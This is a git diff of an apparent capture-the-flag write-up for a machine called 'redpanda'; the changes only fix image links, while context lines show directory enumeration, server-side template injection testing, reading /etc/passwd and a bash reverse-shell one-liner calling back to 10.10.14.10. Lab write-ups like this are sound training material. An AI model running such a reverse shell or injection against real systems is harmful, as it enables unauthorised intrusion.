@@ -156,10 +156,11 @@ gobuster dir -u http://$IP:8080 -w /usr/share/wordlists/dirbuster/directory-list
 ```
 
 Click on `search` button - there was hint about **injection** :
-![[injection.png]]
+![injection.png](img/injection.png)
+
 Found some interesting site:
 
-![[stats.png]]
+![stats.png](img/stats.png)
 We grab some accounts: 
 
 ```
@@ -168,13 +169,13 @@ damian
 ```
 After click to their name we found there is `/img` path that locale image. So i think there will be upload the payload and excute them.
 Function `export` for each user:
-![[export.png]]
+![export.png](img/export.png)
 
 We tried SQLi injection but no luck.
 Go to to find the list injection attack from there.
 [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) 
 Test with `Burpsuite Intruder`:
-![[ssti_injection.png]]
+![ssti_injection.png](img/ssti_injection.png)
 
 Look like it vulneable with character `#` and `*`.
 # Foothold
@@ -210,8 +211,9 @@ As the note at begin, we should replace the `$` with `#` or `*` to test.
 
 We found somethings interest with `*`.
 
-![[java_env.png]]
-![[etc.passwd.png]]
+![java_env.png](img/java_env.png)
+
+![etc.passwd.png](img/etc.passwd.png)
 There is user `woodenk` at OS. And the web application is running on user `woodenk`.
 Lets go deeper to find a way to revershell.
 ## Revershell
@@ -285,8 +287,8 @@ bash -c "bash -i >& /dev/tcp/10.10.14.10/1234 0>&1"
 ```
 
 Copy the output of step 1 and step 2 to use with `Burp Repeater`. 
-![[step1_burp_repeater.png]]
-![[step2_burp_repeater.png]]
+![step1_burp_repeater.png](img/step1_burp_repeater.png)
+![step2_burp_repeater.png](img/step2_burp_repeater.png)
 
 We got the revershell. Well.
 Lets try to automate full process with `auto_exploit.py`
@@ -348,7 +350,7 @@ woodenk@redpanda:/tmp/hsperfdata_woodenk$
 ```
 
 Check the process with `pspy64`
-![[pspy64.png]]
+![pspy64.png](img/pspy64.png)
 ```bash
 2022/08/28 09:06:01 CMD: UID=0    PID=3052   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
 ```
